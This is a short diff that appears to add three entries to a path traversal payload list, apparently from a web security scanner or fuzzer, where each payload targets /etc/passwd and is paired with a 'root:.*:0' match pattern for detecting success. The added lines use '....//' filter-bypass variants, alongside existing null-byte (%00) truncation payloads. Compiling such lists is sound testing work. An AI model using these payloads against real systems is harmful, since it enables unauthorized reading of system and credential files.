@@ -6,6 +6,9 @@
 
 ../../../../../../../../../../../../etc/passwd%00:root:.*:0
 ../../../../../../../../../../../../etc/passwd:root:.*:0
+....//....//....//etc/passwd
+....//....//etc/passwd
+....//....//....//....//etc/passwd
 /etc/passwd:root:.*:0
 /etc/passwd%00:root:.*:0
 
